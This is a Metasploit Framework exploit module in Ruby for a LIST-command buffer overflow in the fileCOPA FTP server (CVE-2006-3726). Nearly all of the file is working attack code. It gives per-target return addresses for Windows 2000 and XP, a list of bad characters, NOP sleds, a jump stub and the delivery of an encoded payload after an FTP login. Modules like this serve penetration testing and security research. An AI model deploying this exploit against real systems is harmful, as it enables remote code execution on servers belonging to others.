##
# $Id: filecopa_list_overflow.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FileCopa FTP Server pre 18 Jul Version',
			'Description'    => %q{
					This module exploits the buffer overflow found in the LIST command
				in fileCOPA FTP server pre 18 Jul 2006 version discovered by www.appsec.ch
			},
			'Author'         => [ 'Jacopo Cervini' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2006-3726' ],
					[ 'OSVDB', '27389' ],
					[ 'BID', '19065' ],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',

			'Targets'        =>
				[
					[ 'Windows 2k Server SP4 English',   { 'Ret' => 0x7c2e7993, 'Nops' => 160 } ], # jmp esp
					[ 'Windows XP Pro SP2 Italian',      { 'Ret' => 0x77f62740, 'Nops' => 240 } ]  # jmp esp
				],
			'DisclosureDate' => 'Jul 19 2006',
			'DefaultTarget' => 0))
	end


	def exploit
		connect_login

		print_status("Trying target #{target.name}...")

		sploit =  "A "
		sploit << make_nops(target['Nops'])
		sploit << [target.ret].pack('V') + make_nops(4) + "\x66\x81\xc1\xa0\x01\x51\xc3" + make_nops(189) + payload.encoded

		send_cmd( ['LIST', sploit] , false)

		handler
		disconnect
	end

end
